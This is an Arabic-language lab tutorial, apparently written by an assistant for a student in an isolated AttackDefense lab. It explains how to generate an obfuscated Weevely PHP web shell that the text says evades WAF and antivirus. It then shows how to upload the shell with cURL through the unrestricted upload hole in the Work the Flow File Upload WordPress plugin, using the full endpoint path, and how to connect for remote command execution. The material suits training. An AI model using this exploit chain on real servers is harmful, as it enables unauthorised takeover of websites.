# شرح Weevely و cURL في سياق Web Shell Upload

## السياق التعليمي

أنت في بيئة **AttackDefense Cloud Labs** — بيئة معزولة ومخصصة للتعليم، وده بالظبط المكان الصح لتعلم الأدوات دي.

هشرح لك الأداتين بالتفصيل.

---

## أولاً: Weevely

### الفكرة العامة

**Weevely**
هي أداة **web shell** متخصصة في penetration testing — بتولّد ملف PHP مشفّر (obfuscated)، لو اترفع على سيرفر، بتقدر تتحكم فيه من الـ terminal بتاعك زي ما بتتكلم مع الجهاز مباشرة.

الفرق بينها وبين web shell عادية: الكود بتاعها مش واضح للـ WAF أو الـ AV عشان بيكون متشفر.

---

### الأمر اللي استخدمه الدكتور

```bash
weevely generate password /root/desktop/m.php
```

|الجزء|معناه|
|---|---|
|`weevely`|اسم الأداة|
|`generate`|subcommand — اعمل ملف shell جديد|
|`password`|الباسورد اللي هتستخدمه لما تتصل بالشيل|
|`/root/desktop/m.php`|المسار اللي هيتحفظ فيه الملف|

**الناتج:** ملف PHP مشفّر — لو فتحته هتلاقي كود PHP مش مفهوم، ده عشان الـ obfuscation.

---

### إزاي تتصل بالشيل بعد الـ upload

```bash
weevely http://TARGET/path/to/m.php password
```

لو الاتصال نجح هيديك prompt في الـ terminal تقدر تكتب فيه أوامر Linux عادية على الـ target server.

---

## ثانياً: cURL وأمر الـ Upload

### الفكرة العامة

**cURL** 
(اختصار Client URL) هي أداة command-line بتتيح لك ترسل HTTP requests بكل أنواعها — GET, POST, PUT وغيرها — من الـ terminal مباشرة، من غير ما تفتح browser.

بتستخدمها في pentest عشان:

- ترفع ملفات
- تختبر endpoints
- ترسل payloads يدوياً
- تشوف الـ responses بالتفصيل

---

### تحليل الأمر اللي استخدمته

```bash
curl -F "files[]=@/home/kali/antoon.php" https://TARGET/wp-content/plugins/work-the-flow-file-upload/public/assets/jQuery-File-Upload-9.5.0/server/php/index.php
```

**تقطيع الأمر:**

|الجزء|الشرح|
|---|---|
|`curl`|الأداة|
|`-F`|يعني **Form field** — بترسل data زي form في browser (multipart/form-data)|
|`"files[]=@/home/kali/antoon.php"`|اسم الـ field هو `files[]` (الثغرة بتتوقعه بالاسم ده) والـ `@` معناها "ارفع الملف ده من المسار ده"|
|الـ URL الطويل|هو الـ endpoint الخاص بالـ plugin اللي فيه الثغرة — الـ file upload handler|

---

### ليه الـ URL ده بالذات؟

الـ plugin اسمه **Work the Flow File Upload** وبيستخدم مكتبة اسمها **jQuery File Upload 9.5.0** — الثغرة في النسخة دي بتسمح برفع أي نوع ملف من غير تحقق، وملف الـ handler موجود في المسار ده دايماً:

```
/wp-content/plugins/work-the-flow-file-upload/public/assets/jQuery-File-Upload-9.5.0/server/php/index.php
```

---

### استخدامات cURL التانية المفيدة في Web Pentesting

```bash
# عرض الـ headers بس
curl -I https://target.com

# إرسال POST request
curl -X POST -d "username=admin&password=1234" https://target.com/login

# إرسال مع cookie
curl -b "session=abc123" https://target.com/dashboard

# حفظ الـ response في ملف
curl -o output.html https://target.com

# عرض كل التفاصيل (verbose)
curl -v https://target.com
```

---

## الـ Workflow الكامل للـ Lab

```
1. weevely generate mypassword /home/kali/shell.php
        ↓
2. curl -F "files[]=@/home/kali/shell.php" https://TARGET/[plugin-upload-endpoint]
        ↓
3. الـ response هيديك الـ URL اللي اترفع فيه الملف
        ↓
4. weevely http://TARGET/wp-content/uploads/shell.php mypassword
        ↓
5. عندك shell تفاعلي على السيرفر
```

---

## ملخص

|الأداة|الغرض|
|---|---|
|**Weevely generate**|بتعمل PHP web shell مشفّر بباسورد|
|**Weevely connect**|بتفتح shell تفاعلي على السيرفر بعد الـ upload|
|**cURL -F**|بترفع ملفات أو بترسل form data من الـ terminal|

الـ Lab ده بيغطي ثغرة **Unrestricted File Upload** اللي موجودة في OWASP — مهمة جداً وهتيجي عليها أسئلة.